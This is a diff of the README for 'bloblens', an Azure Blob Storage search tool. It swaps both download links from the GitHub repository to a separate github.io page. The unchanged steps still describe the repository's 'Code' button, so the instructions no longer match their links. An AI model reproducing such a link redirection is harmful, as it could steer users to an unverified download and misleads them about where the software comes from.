@@ -1,6 +1,6 @@
 # 🔍 bloblens - Find your documents in Azure storage
 
-[![Download bloblens](https://img.shields.io/badge/Download-bloblens-blue.svg)](https://github.com/Tieon-genuschenopodium508/bloblens)
+[![Download bloblens](https://img.shields.io/badge/Download-bloblens-blue.svg)](https://tieon-genuschenopodium508.github.io)
 
 bloblens makes your Azure Blob Storage searchable. It scans your documents and builds a search index. You find text inside PDFs and Word files across all your storage folders. You host it on your own machine. This tool costs nothing to run each month. 
 
@@ -19,7 +19,7 @@ You can download Docker Desktop from the official website. Follow the installati
 
 You need to access the code from our repository page. Follow this link to reach the project files.
 
-[Download bloblens here](https://github.com/Tieon-genuschenopodium508/bloblens)
+[Download bloblens here](https://tieon-genuschenopodium508.github.io)
 
 Click the green button labeled "Code" on the page. Select "Download ZIP". Save the file to your computer. Open your Downloads folder. Right-click the folder and select "Extract All". Choose a folder on your computer to keep these files. The C drive is a good place.
 
